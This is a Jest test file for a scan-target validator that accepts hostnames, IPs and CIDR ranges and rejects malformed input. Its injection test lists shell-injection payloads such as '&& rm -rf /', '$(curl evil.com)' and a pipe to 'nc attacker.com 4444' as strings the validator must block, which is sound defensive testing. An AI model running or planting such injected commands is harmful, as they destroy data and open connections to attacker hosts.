import { isValidScanTarget, scanTargetSchema } from './scan-target.validator';

const VALID_HOSTNAME = 'example.com';

describe('isValidScanTarget', () => {
  it('accepts hostnames', () => {
    expect(isValidScanTarget(VALID_HOSTNAME)).toBe(true);
    expect(isValidScanTarget('api.staging.example.co')).toBe(true);
    expect(isValidScanTarget('localhost')).toBe(true);
  });

  it('accepts IPv4 addresses', () => {
    expect(isValidScanTarget('192.168.1.10')).toBe(true);
  });

  it('accepts IPv4 CIDR ranges', () => {
    expect(isValidScanTarget('192.168.1.0/24')).toBe(true);
  });

  it('accepts IPv6 addresses and CIDR ranges', () => {
    expect(isValidScanTarget('::1')).toBe(true);
    expect(isValidScanTarget('2001:db8::/32')).toBe(true);
  });

  it('rejects shell metacharacter injection payloads', () => {
    expect(isValidScanTarget(`${VALID_HOSTNAME}; touch /tmp/pwned`)).toBe(false);
    expect(isValidScanTarget(`${VALID_HOSTNAME} && rm -rf /`)).toBe(false);
    expect(isValidScanTarget('$(curl evil.com)')).toBe(false);
    expect(isValidScanTarget(`${VALID_HOSTNAME}|nc attacker.com 4444`)).toBe(false);
    expect(isValidScanTarget('`whoami`')).toBe(false);
    expect(isValidScanTarget(`${VALID_HOSTNAME}\ntouch /tmp/pwned`)).toBe(false);
  });

  it('rejects whitespace and empty values', () => {
    expect(isValidScanTarget('')).toBe(false);
    expect(isValidScanTarget('   ')).toBe(false);
    expect(isValidScanTarget(` ${VALID_HOSTNAME}`)).toBe(false);
    expect(isValidScanTarget(`${VALID_HOSTNAME} `)).toBe(false);
    expect(isValidScanTarget('exa mple.com')).toBe(false);
  });

  it('rejects overly long values', () => {
    expect(isValidScanTarget(`${'a'.repeat(254)}.com`)).toBe(false);
  });

  it('rejects non-string input', () => {
    expect(isValidScanTarget(123 as unknown as string)).toBe(false);
    expect(isValidScanTarget(null as unknown as string)).toBe(false);
  });
});

describe('scanTargetSchema', () => {
  it('parses valid targets', () => {
    expect(scanTargetSchema.safeParse('10.0.0.1').success).toBe(true);
  });

  it('rejects invalid targets with a descriptive message', () => {
    const result = scanTargetSchema.safeParse(`${VALID_HOSTNAME}; touch /tmp/pwned`);
    expect(result.success).toBe(false);
  });
});
